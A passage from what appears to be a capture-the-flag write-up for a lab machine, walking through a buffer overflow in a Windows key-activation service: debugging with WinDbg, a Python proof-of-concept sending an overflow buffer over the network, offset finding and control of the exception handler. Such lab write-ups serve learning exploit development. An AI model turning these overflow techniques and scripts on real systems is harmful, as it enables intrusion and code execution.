<span class="nv">ymm0</span><span class="o">=</span><span class="w">           </span><span class="m">0</span><span class="w">            </span><span class="m">0</span><span class="w">            </span><span class="m">0</span><span class="w">            </span><span class="m">0</span><span class="w">            </span><span class="m">0</span><span class="w">            </span><span class="m">0</span><span class="w">            </span><span class="m">0</span><span class="w">            </span><span class="m">0</span>
</code></pre></div>
<p>Based on what I understand so far, it seems we need to fill a buffer through Option 1, and we can cause arbitrary code execution through Option 2 so long as the key is found.</p>
<h2 id="dynamic-analysis">Dynamic Analysis<a class="headerlink" href="#dynamic-analysis" title="Permanent link">¶</a></h2>
<p>If I run the application on my sandbox VM, it opens a port 4141.  If I connect to it using <code>netcat</code>, and try supplying one of the keys provided in <code>dev_keys.txt</code>, it says it couldn't find the key.</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251101113232.png" data-desc-position="bottom"><img alt="Pasted_image_20251101113232.png" src="../../../../Pasted_image_20251101113232.png"></a></p>
<p>The console output of the application server-side:</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251101113453.png" data-desc-position="bottom"><img alt="Pasted_image_20251101113453.png" src="../../../../Pasted_image_20251101113453.png"></a></p>
<p>The function <code>find_key</code> does make mention of <code>keys.txt</code>, but just to be sure where it expects it...</p>
<p>If I use Process Monitor from Sysinternals (<a href="https://learn.microsoft.com/en-us/sysinternals/downloads/procmon">https://learn.microsoft.com/en-us/sysinternals/downloads/procmon</a>), with the following filtering:
* process name contains 'dev_keysvc'</p>
<p>When I resend the same flow of requests (option 1, option 2), there is an attempt to <code>CreateFile</code>(handle) on a file <code>keys.txt</code> in the same working directory as the binary.</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251101114028.png" data-desc-position="bottom"><img alt="Pasted_image_20251101114028.png" src="../../../../Pasted_image_20251101114028.png"></a></p>
<p>So I'll create the file with the same contents as provided in the original <code>dev_keys.txt</code>:</p>
<div class="highlight"><pre><span></span><code>100-FE9A1-500-A270-0102-U3RhbmRhcmQgTGljZW5zZQ==
101-FE9A1-550-A271-0109-UHJlbWl1bSBMaWNlbnNl
102-FE9A1-500-A272-0106-UHJlbWl1bSBMaWNlbnNl
</code></pre></div>
<p>After going through the same flow, the error output no longer occurs, but the application still sends back to the client "Could not find key!".</p>
<div class="highlight"><pre><span></span><code>Checking key: 101-FE9A1-550-A271-0109, Comment: Premium License
Could not find key!
Choose an option:
1. Set key
2. Activate key
3. Exit
</code></pre></div>
<p>For this particular example, we need the 64bit <code>windbg</code>, and tailored to this application,  it would be:</p>
<div class="highlight"><pre><span></span><code><span class="p">((</span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">c</span> <span class="s2">"taskkill /F /IM dev_keysvc.exe"</span> <span class="p">&amp;&amp;</span> <span class="n">timeout</span> <span class="n">3</span> <span class="p">&amp;&amp;</span> <span class="nb">START </span><span class="p">/</span><span class="n">B</span> <span class="s2">""</span> <span class="s2">"C:\reaper\dev_keysvc.exe"</span> <span class="p">&gt;</span> <span class="n">c</span><span class="p">:\</span><span class="n">reaper</span><span class="p">\</span><span class="n">output</span><span class="p">.</span><span class="n">txt</span><span class="p">)</span> <span class="p">||</span> <span class="nb">START </span><span class="p">/</span><span class="n">B</span> <span class="s2">""</span> <span class="s2">"C:\reaper\dev_keysvc.exe"</span> <span class="p">&gt;</span> <span class="n">c</span><span class="p">:\</span><span class="n">reaper</span><span class="p">\</span><span class="n">output</span><span class="p">.</span><span class="n">txt</span><span class="p">)</span> <span class="p">&amp;&amp;</span> <span class="n">timeout</span> <span class="n">3</span> <span class="p">&amp;&amp;</span> <span class="s2">"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\windbg.exe"</span> <span class="n">-WF</span> <span class="n">C</span><span class="p">:\</span><span class="n">windbg_custom</span><span class="p">.</span><span class="n">WEW</span> <span class="n">-pn</span> <span class="n">dev_keysvc</span><span class="p">.</span><span class="n">exe</span> <span class="n">-c</span> <span class="s1">'g'</span>
</code></pre></div>
<p>The <code>-c</code> cmd specifies instructions to start with.  In this case I just want to attach to it and continue, and that way I can fuzz at it, to see if I can invoke a crash.</p>
<p>Other note, but it has to be started from a <code>cmd.exe</code>, powershell won't work here.</p>
<p>Basic send Options 1, 2, 3
</p><div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/reaper<span class="o">]</span>
└─$<span class="w"> </span>nc<span class="w"> </span><span class="m">192</span>.168.56.100<span class="w"> </span><span class="m">4141</span><span class="w"> </span>&lt;<span class="w"> </span>&lt;<span class="o">(</span><span class="nb">echo</span><span class="w"> </span>-ne<span class="w"> </span><span class="s2">"1\n101-FE9A1-550-A271-0109-UHJlbWl1bSBMaWNlbnNl\n"</span><span class="p">;</span><span class="w"> </span>sleep<span class="w"> </span><span class="m">2</span><span class="p">;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span>-ne<span class="w"> </span><span class="s2">"2\n"</span><span class="p">;</span><span class="w"> </span>sleep<span class="w"> </span><span class="m">2</span><span class="p">;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span>-ne<span class="w"> </span><span class="s2">"3\n"</span><span class="o">)</span>
Choose<span class="w"> </span>an<span class="w"> </span>option:
<span class="m">1</span>.<span class="w"> </span>Set<span class="w"> </span>key
<span class="m">2</span>.<span class="w"> </span>Activate<span class="w"> </span>key
<span class="m">3</span>.<span class="w"> </span>Exit
Enter<span class="w"> </span>a<span class="w"> </span>key:<span class="w"> </span>Valid<span class="w"> </span>key<span class="w"> </span>format
Choose<span class="w"> </span>an<span class="w"> </span>option:
<span class="m">4</span>.<span class="w"> </span>Set<span class="w"> </span>key
<span class="m">5</span>.<span class="w"> </span>Activate<span class="w"> </span>key
<span class="m">6</span>.<span class="w"> </span>Exit
Checking<span class="w"> </span>key:<span class="w"> </span><span class="m">101</span>-FE9A1-550-A271-0109,<span class="w"> </span>Comment:<span class="w"> </span>Premium<span class="w"> </span>License
Could<span class="w"> </span>not<span class="w"> </span>find<span class="w"> </span>key!
Choose<span class="w"> </span>an<span class="w"> </span>option:
<span class="m">7</span>.<span class="w"> </span>Set<span class="w"> </span>key
<span class="m">8</span>.<span class="w"> </span>Activate<span class="w"> </span>key
<span class="m">9</span>.<span class="w"> </span>Exit
</code></pre></div><p></p>
<p>When I attach to <code>dev_keysvc.exe</code> using <code>windbg</code>, the process is loaded into a memory range that differs from the AddressOfEntryPoint field in the PE header.</p>
<div class="highlight"><pre><span></span><code>ModLoad: 00007ff7`66a80000 00007ff7`66ab3000   C:\reaper\dev_keysvc.exe
</code></pre></div>
<p>Obviously my <code>Ghidra</code> analysis will need to be rebased to this range.  That is done by opening Alt+W (window), selecting Memory Map, and selecting the Home icon.</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251101154640.png" data-desc-position="bottom"><img alt="Pasted_image_20251101154640.png" src="../../../../Pasted_image_20251101154640.png"></a></p>
<p>Afterward all of the addressing will match up with <code>windbg</code>.  I need to break at the function call to <code>find_key</code></p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251101160445.png" data-desc-position="bottom"><img alt="Pasted_image_20251101160445.png" src="../../../../Pasted_image_20251101160445.png"></a></p>
<p>After rebase, it is at <code>7ff766a811ca</code></p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251101160555.png" data-desc-position="bottom"><img alt="Pasted_image_20251101160555.png" src="../../../../Pasted_image_20251101160555.png"></a></p>
<h3 id="fuzzing-for-a-controllable-crash">Fuzzing for a controllable crash<a class="headerlink" href="#fuzzing-for-a-controllable-crash" title="Permanent link">¶</a></h3>
<p>I am able to select option 1, send the key, select option 2, and select option three with the following basic python </p>
<div class="highlight"><pre><span></span><code><span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"USAGE: </span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2"> ip:port &lt;optional&gt;"</span><span class="p">)</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">ip</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">":"</span><span class="p">)</span>
        <span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">)</span>
        <span class="n">sock</span> <span class="o">=</span> <span class="n">cx</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>


    <span class="n">numeral</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
    <span class="n">pay</span> <span class="o">=</span> <span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="nb">bytearray</span><span class="p">(</span><span class="s2">"A"</span><span class="o">*</span><span class="n">numeral</span><span class="p">,</span><span class="s1">'latin-1'</span><span class="p">)))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'latin-1'</span><span class="p">)</span>
    <span class="n">bufs</span> <span class="o">=</span> <span class="p">[</span><span class="s2">"1</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="sa">f</span><span class="s2">"110-FE9A1-550-A271-0109-</span><span class="si">{</span><span class="n">pay</span><span class="si">}</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"2</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"3</span><span class="se">\n</span><span class="s2">"</span><span class="p">]</span>

    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">bufs</span><span class="p">)):</span>
        <span class="c1">## recv from server</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">))</span>
        <span class="c1">## print first 32 bytes of what will be sent</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"</span><span class="si">{</span><span class="n">bufs</span><span class="p">[</span><span class="n">x</span><span class="p">][:</span><span class="mi">32</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">((</span><span class="sa">b</span><span class="s1">'</span><span class="se">\x0a</span><span class="s1">'</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'latin-1'</span><span class="p">),</span><span class="sa">r</span><span class="s1">'</span><span class="se">\\</span><span class="s1">n'</span><span class="p">)</span><span class="si">}</span><span class="s2">[...]"</span><span class="p">)</span>
        <span class="c1">## send to server</span>
        <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">bufs</span><span class="p">[</span><span class="n">x</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">'latin-1'</span><span class="p">))</span>
</code></pre></div>
<p>If I set a breakpoint at the call to <code>find_key</code>, after I send a buffer of 3000 As:</p>
<p>The breakpoint is hit</p>
<div class="highlight"><pre><span></span><code>Breakpoint 0 hit
dev_keysvc+0x11ca:
00007ff7`66a811ca e841070000      call    dev_keysvc+0x1910 (00007ff7`66a81910)
</code></pre></div>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251101182531.png" data-desc-position="bottom"><img alt="Pasted_image_20251101182531.png" src="../../../../Pasted_image_20251101182531.png"></a></p>
<p>Looking at the exception chain, it is already overflowed by the buffer.</p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251101182803.png" data-desc-position="bottom"><img alt="Pasted_image_20251101182803.png" src="../../../../Pasted_image_20251101182803.png"></a></p>
<p>For reference, this crash occured with an input buffer (before base64) of just 3000 bytes.  Obviously these 3000 bytes get base64'd and appended to the beginning of the key.</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/reaper<span class="o">]</span>
└─$<span class="w"> </span>./poc.py<span class="w"> </span><span class="m">192</span>.168.56.100:4141<span class="w"> </span><span class="m">3000</span>

┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/reaper<span class="o">]</span>
└─$<span class="w"> </span>cat<span class="w"> </span>poc.py<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span>-v<span class="w"> </span><span class="nv">RS</span><span class="o">=</span><span class="s2">""</span><span class="w"> </span><span class="s1">'/bufs/'</span><span class="w"> </span>
<span class="w">    </span><span class="nv">numeral</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>int<span class="o">(</span>sys.argv<span class="o">[</span><span class="m">2</span><span class="o">])</span>
<span class="w">    </span><span class="nv">pay</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>base64.b64encode<span class="o">(</span>bytearray<span class="o">(</span><span class="s2">"A"</span>*numeral,<span class="s1">'latin-1'</span><span class="o">)))</span>.decode<span class="o">(</span><span class="s1">'latin-1'</span><span class="o">)</span>
<span class="w">    </span><span class="nv">bufs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span><span class="s2">"1\n"</span>,<span class="w"> </span>f<span class="s2">"110-FE9A1-550-A271-0109-{pay}\n"</span>,<span class="w"> </span><span class="s2">"2\n"</span>,<span class="w"> </span><span class="s2">"3\n"</span><span class="o">]</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span>x<span class="w"> </span><span class="k">in</span><span class="w"> </span>range<span class="o">(</span><span class="m">0</span>,len<span class="o">(</span>bufs<span class="o">))</span>:
<span class="w">        </span>print<span class="o">(</span>sock.recv<span class="o">(</span><span class="m">4096</span><span class="o">))</span>
<span class="w">        </span>print<span class="o">(</span>f<span class="s2">"{bufs[x][:32].replace((b'\x0a').decode('latin-1'),r'\\n')}[...]"</span><span class="o">)</span>
<span class="w">        </span>sock.send<span class="o">(</span>bufs<span class="o">[</span>x<span class="o">]</span>.encode<span class="o">(</span><span class="s1">'latin-1'</span><span class="o">))</span>
</code></pre></div>
<p>Call stack with emphasis on exception-related information</p>
<div class="highlight"><pre><span></span><code>0:003&gt; kb e
 # RetAddr               : Args to Child                                                           : Call Site
00 41414141`41414141     : 41414141`41414141 41414141`41414141 41414141`41414141 41414141`41414141 : dev_keysvc+0x16f1
01 41414141`41414141     : 41414141`41414141 41414141`41414141 41414141`41414141 41414141`41414141 : 0x41414141`41414141
02 41414141`41414141     : 41414141`41414141 41414141`41414141 41414141`41414141 41414141`41414141 : 0x41414141`41414141
03 41414141`41414141     : 41414141`41414141 41414141`41414141 41414141`41414141 41414141`41414141 : 0x41414141`41414141
04 41414141`41414141     : 41414141`41414141 41414141`41414141 41414141`41414141 41414141`41414141 : 0x41414141`41414141
</code></pre></div>
<h3 id="triangulating-a-pattern">Triangulating a pattern<a class="headerlink" href="#triangulating-a-pattern" title="Permanent link">¶</a></h3>
<p>If I re-run this same excercise, but instead of 3000 As I pass a pattern string of length 3000:</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/reaper<span class="o">]</span>
└─$<span class="w"> </span>./poc.py<span class="w"> </span><span class="m">192</span>.168.56.100:4141<span class="w"> </span><span class="k">$(</span>msf-pattern_create<span class="w"> </span><span class="m">64</span><span class="w"> </span>-l<span class="w"> </span><span class="m">3000</span><span class="k">)</span>

┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/reaper<span class="o">]</span>
└─$<span class="w"> </span>cat<span class="w"> </span>poc.py<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span>-v<span class="w"> </span><span class="nv">RS</span><span class="o">=</span><span class="s2">""</span><span class="w"> </span><span class="s1">'/bufs/'</span><span class="w"> </span>

<span class="w">    </span><span class="nv">pattern</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>sys.argv<span class="o">[</span><span class="m">2</span><span class="o">]</span>
<span class="w">    </span><span class="nv">pay</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>base64.b64encode<span class="o">(</span>bytearray<span class="o">(</span>pattern,<span class="s1">'latin-1'</span><span class="o">)))</span>.decode<span class="o">(</span><span class="s1">'latin-1'</span><span class="o">)</span>
<span class="w">    </span><span class="nv">bufs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span><span class="s2">"1\n"</span>,<span class="w"> </span>f<span class="s2">"110-FE9A1-550-A271-0109-{pay}\n"</span>,<span class="w"> </span><span class="s2">"2\n"</span>,<span class="w"> </span><span class="s2">"3\n"</span><span class="o">]</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span>x<span class="w"> </span><span class="k">in</span><span class="w"> </span>range<span class="o">(</span><span class="m">0</span>,len<span class="o">(</span>bufs<span class="o">))</span>:
<span class="w">        </span>print<span class="o">(</span>sock.recv<span class="o">(</span><span class="m">4096</span><span class="o">))</span>
<span class="w">        </span>print<span class="o">(</span>f<span class="s2">"{bufs[x][:32].replace((b'\x0a').decode('latin-1'),r'\\n')}[...]"</span><span class="o">)</span>
<span class="w">        </span>sock.send<span class="o">(</span>bufs<span class="o">[</span>x<span class="o">]</span>.encode<span class="o">(</span><span class="s1">'latin-1'</span><span class="o">))</span>
</code></pre></div>
<p>The pattern appears:</p>
<div class="highlight"><pre><span></span><code>00007ff7<span class="sb">`</span>66a81937<span class="w"> </span>e874fcffff<span class="w">      </span>call<span class="w">    </span>dev_keysvc+0x15b0<span class="w"> </span><span class="o">(</span>00007ff7<span class="sb">`</span>66a815b0<span class="o">)</span>
<span class="m">0</span>:003&gt;<span class="w"> </span>p
<span class="o">(</span>136c.e0c<span class="o">)</span>:<span class="w"> </span>Access<span class="w"> </span>violation<span class="w"> </span>-<span class="w"> </span>code<span class="w"> </span>c0000005<span class="w"> </span><span class="o">(</span>first<span class="w"> </span>chance<span class="o">)</span>
First<span class="w"> </span>chance<span class="w"> </span>exceptions<span class="w"> </span>are<span class="w"> </span>reported<span class="w"> </span>before<span class="w"> </span>any<span class="w"> </span>exception<span class="w"> </span>handling.
This<span class="w"> </span>exception<span class="w"> </span>may<span class="w"> </span>be<span class="w"> </span>expected<span class="w"> </span>and<span class="w"> </span>handled.
dev_keysvc+0x16f1:
00007ff7<span class="sb">`</span>66a816f1<span class="w"> </span>c3<span class="w">              </span>ret
<span class="m">0</span>:003&gt;<span class="w"> </span>!exchain
<span class="m">100</span><span class="w"> </span>stack<span class="w"> </span>frames,<span class="w"> </span>scanning<span class="w"> </span><span class="k">for</span><span class="w"> </span>handlers...
Frame<span class="w"> </span>0x01:<span class="w"> </span>error<span class="w"> </span>getting<span class="w"> </span>module<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">3164413064413963</span>
Frame<span class="w"> </span>0x02:<span class="w"> </span>error<span class="w"> </span>getting<span class="w"> </span>module<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">6441336441326441</span>
Frame<span class="w"> </span>0x03:<span class="w"> </span>error<span class="w"> </span>getting<span class="w"> </span>module<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">4136644135644134</span>
Frame<span class="w"> </span>0x04:<span class="w"> </span>error<span class="w"> </span>getting<span class="w"> </span>module<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">3964413864413764</span>

<span class="o">[</span>...<span class="o">]</span>

<span class="m">0</span>:003&gt;<span class="w"> </span>kb<span class="w"> </span>e
<span class="w"> </span><span class="c1"># RetAddr               : Args to Child                                                           : Call Site</span>
<span class="m">00</span><span class="w"> </span><span class="m">31644130</span><span class="sb">`</span><span class="m">64413963</span><span class="w">     </span>:<span class="w"> </span><span class="m">64413364</span><span class="sb">`</span><span class="m">41326441</span><span class="w"> </span><span class="m">41366441</span><span class="sb">`</span><span class="m">35644134</span><span class="w"> </span><span class="m">39644138</span><span class="sb">`</span><span class="m">64413764</span><span class="w"> </span><span class="m">65413165</span><span class="sb">`</span><span class="m">41306541</span><span class="w"> </span>:<span class="w"> </span>dev_keysvc+0x16f1
<span class="m">01</span><span class="w"> </span><span class="m">64413364</span><span class="sb">`</span><span class="m">41326441</span><span class="w">     </span>:<span class="w"> </span><span class="m">41366441</span><span class="sb">`</span><span class="m">35644134</span><span class="w"> </span><span class="m">39644138</span><span class="sb">`</span><span class="m">64413764</span><span class="w"> </span><span class="m">65413165</span><span class="sb">`</span><span class="m">41306541</span><span class="w"> </span><span class="m">41346541</span><span class="sb">`</span><span class="m">33654132</span><span class="w"> </span>:<span class="w"> </span>0x31644130<span class="sb">`</span><span class="m">64413963</span>
<span class="m">02</span><span class="w"> </span><span class="m">41366441</span><span class="sb">`</span><span class="m">35644134</span><span class="w">     </span>:<span class="w"> </span><span class="m">39644138</span><span class="sb">`</span><span class="m">64413764</span><span class="w"> </span><span class="m">65413165</span><span class="sb">`</span><span class="m">41306541</span><span class="w"> </span><span class="m">41346541</span><span class="sb">`</span><span class="m">33654132</span><span class="w"> </span><span class="m">37654136</span><span class="sb">`</span><span class="m">65413565</span><span class="w"> </span>:<span class="w"> </span>0x64413364<span class="sb">`</span><span class="m">41326441</span>
<span class="m">03</span><span class="w"> </span><span class="m">39644138</span><span class="sb">`</span><span class="m">64413764</span><span class="w">     </span>:<span class="w"> </span><span class="m">65413165</span><span class="sb">`</span><span class="m">41306541</span><span class="w"> </span><span class="m">41346541</span><span class="sb">`</span><span class="m">33654132</span><span class="w"> </span><span class="m">37654136</span><span class="sb">`</span><span class="m">65413565</span><span class="w"> </span><span class="m">66413965</span><span class="sb">`</span><span class="m">41386541</span><span class="w"> </span>:<span class="w"> </span>0x41366441<span class="sb">`</span><span class="m">35644134</span>
</code></pre></div>
<p>Exact match at 88 bytes in.</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/reaper<span class="o">]</span>
└─$<span class="w"> </span>msf-pattern_offset<span class="w"> </span><span class="m">64</span><span class="w"> </span>-l<span class="w"> </span><span class="m">3000</span><span class="w"> </span>-q<span class="w"> </span><span class="m">3164413064413963</span>
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Exact<span class="w"> </span>match<span class="w"> </span>at<span class="w"> </span>offset<span class="w"> </span><span class="m">88</span>
</code></pre></div>
<h3 id="controlling-seh">Controlling SEH<a class="headerlink" href="#controlling-seh" title="Permanent link">¶</a></h3>
<p>After refactoring for controlling SEH, </p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/reaper<span class="o">]</span>
└─$<span class="w"> </span>./poc.py<span class="w"> </span><span class="m">192</span>.168.56.100:4141

┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/reaper<span class="o">]</span>
└─$<span class="w"> </span>cat<span class="w"> </span>poc.py<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span>-v<span class="w"> </span><span class="nv">RS</span><span class="o">=</span><span class="s2">""</span><span class="w"> </span><span class="s1">'/bufs/'</span><span class="w"> </span>

<span class="w">    </span><span class="nv">crash</span><span class="o">=</span><span class="m">3000</span>
<span class="w">    </span><span class="nv">crashlen</span><span class="o">=</span><span class="m">88</span>
<span class="w">    </span><span class="nv">onramp</span><span class="o">=(</span><span class="s2">"\x41"</span><span class="o">)</span>*crashlen
<span class="w">    </span><span class="nv">SEH</span><span class="o">=(</span><span class="s2">"\x42"</span>*8<span class="o">)</span>
<span class="w">    </span><span class="nv">offramp</span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="s2">"\x43"</span><span class="w"> </span>*<span class="w"> </span><span class="o">(</span>crash<span class="w"> </span>-<span class="w"> </span>sum<span class="o">([</span>len<span class="o">(</span>x<span class="o">)</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>x<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="o">[</span>
<span class="w">        </span>onramp,
<span class="w">        </span>SEH
<span class="w">    </span><span class="o">]])))</span>
<span class="w">    </span><span class="nv">compiled_payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>f<span class="s2">"{onramp}{SEH}{offramp}"</span>
<span class="w">    </span><span class="nv">pay</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>base64.b64encode<span class="o">(</span>bytearray<span class="o">(</span>compiled_payload,<span class="s1">'latin-1'</span><span class="o">)))</span>.decode<span class="o">(</span><span class="s1">'latin-1'</span><span class="o">)</span>
<span class="w">    </span><span class="nv">bufs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span><span class="s2">"1\n"</span>,<span class="w"> </span>f<span class="s2">"110-FE9A1-550-A271-0109-{pay}\n"</span>,<span class="w"> </span><span class="s2">"2\n"</span>,<span class="w"> </span><span class="s2">"3\n"</span><span class="o">]</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span>x<span class="w"> </span><span class="k">in</span><span class="w"> </span>range<span class="o">(</span><span class="m">0</span>,len<span class="o">(</span>bufs<span class="o">))</span>:
<span class="w">        </span>print<span class="o">(</span>sock.recv<span class="o">(</span><span class="m">4096</span><span class="o">))</span>
<span class="w">        </span>print<span class="o">(</span>f<span class="s2">"{bufs[x][:32].replace((b'\x0a').decode('latin-1'),r'\\n')}[...]"</span><span class="o">)</span>
<span class="w">        </span>sock.send<span class="o">(</span>bufs<span class="o">[</span>x<span class="o">]</span>.encode<span class="o">(</span><span class="s1">'latin-1'</span><span class="o">))</span>
</code></pre></div>
<p>SEH is controlled</p>
<div class="highlight"><pre><span></span><code>00007ff7`66a81937 e874fcffff      call    dev_keysvc+0x15b0 (00007ff7`66a815b0)
0:001&gt; p
(2110.1378): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
dev_keysvc+0x16f1:
00007ff7`66a816f1 c3              ret
0:001&gt; !exchain
100 stack frames, scanning for handlers...
Frame 0x01: error getting module for 4242424242424242
Frame 0x02: error getting module for 4343434343434343
Frame 0x03: error getting module for 4343434343434343
Frame 0x04: error getting module for 4343434343434343

[...]

0:001&gt; kb e
 # RetAddr               : Args to Child                                                           : Call Site
00 42424242`42424242     : 43434343`43434343 43434343`43434343 43434343`43434343 43434343`43434343 : dev_keysvc+0x16f1
01 43434343`43434343     : 43434343`43434343 43434343`43434343 43434343`43434343 43434343`43434343 : 0x42424242`42424242
02 43434343`43434343     : 43434343`43434343 43434343`43434343 43434343`43434343 43434343`43434343 : 0x43434343`43434343
03 43434343`43434343     : 43434343`43434343 43434343`43434343 43434343`43434343 43434343`43434343 : 0x43434343`43434343
</code></pre></div>
<h3 id="identifying-bad-characters">Identifying bad characters<a class="headerlink" href="#identifying-bad-characters" title="Permanent link">¶</a></h3>
<p>I have a function I created for this, <code>gen_badchars</code>.  It will create a string containing all bytes sequentially between a start and end range, then filter out any that are passed as first argument.</p>
<div class="highlight"><pre><span></span><code><span class="n">badchars</span> <span class="o">=</span> <span class="s2">""</span>
<span class="k">def</span><span class="w"> </span><span class="nf">gen_badchars</span><span class="p">(</span><span class="n">bc</span><span class="p">,</span> <span class="n">start</span><span class="o">=</span><span class="s2">"</span><span class="se">\x01</span><span class="s2">"</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s2">"</span><span class="se">\xff</span><span class="s2">"</span><span class="p">):</span>
    <span class="n">s_int</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">start</span><span class="p">)</span>
    <span class="n">e_int</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">end</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span>
    <span class="n">BC</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="n">s_int</span><span class="p">,</span><span class="n">e_int</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'latin-1'</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">bc</span><span class="p">:</span>
